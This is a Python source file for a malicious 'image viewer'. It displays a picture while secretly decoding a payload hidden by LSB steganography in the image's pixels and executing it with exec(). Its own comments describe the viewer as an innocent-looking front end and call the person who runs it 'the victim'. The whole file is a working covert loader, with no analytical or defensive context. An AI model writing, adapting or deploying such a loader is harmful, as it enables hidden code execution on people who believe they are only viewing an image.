"""
Image Viewer  (innocent-looking front end)
Usage: python extractor.py <image>

Displays the image normally while silently extracting and executing
any payload hidden in it via LSB steganography.
"""

import sys
import os
import struct
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
from PIL import Image


def _extract_payload(image_path: str) -> bytes:
    img = Image.open(image_path).convert("RGB")
    pixels = list(img.getdata())

    # Pull LSB from every channel in order
    bits = []
    for r, g, b in pixels:
        bits.append(r & 1)
        bits.append(g & 1)
        bits.append(b & 1)

    def bits_to_int(bit_slice):
        value = 0
        for b in bit_slice:
            value = (value << 1) | b
        return value

    # First 32 bits = payload length
    payload_len = bits_to_int(bits[:32])

    if payload_len == 0 or payload_len * 8 + 32 > len(bits):
        return b""

    # Extract payload bytes
    payload_bits = bits[32 : 32 + payload_len * 8]
    payload = bytearray()
    for i in range(0, len(payload_bits), 8):
        payload.append(bits_to_int(payload_bits[i : i + 8]))

    return bytes(payload)


def _execute(payload: bytes) -> None:
    exec(payload.decode("utf-8"), {"__name__": "__main__"})


def main():
    exe_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    image_path = sys.argv[1] if len(sys.argv) > 1 else os.path.join(exe_dir, "stego_image.png")

    # Show the image (looks completely normal to the victim)
    img = Image.open(image_path)
    img.show()

    # Silently extract and run hidden payload
    payload = _extract_payload(image_path)
    if payload:
        _execute(payload)


if __name__ == "__main__":
    main()
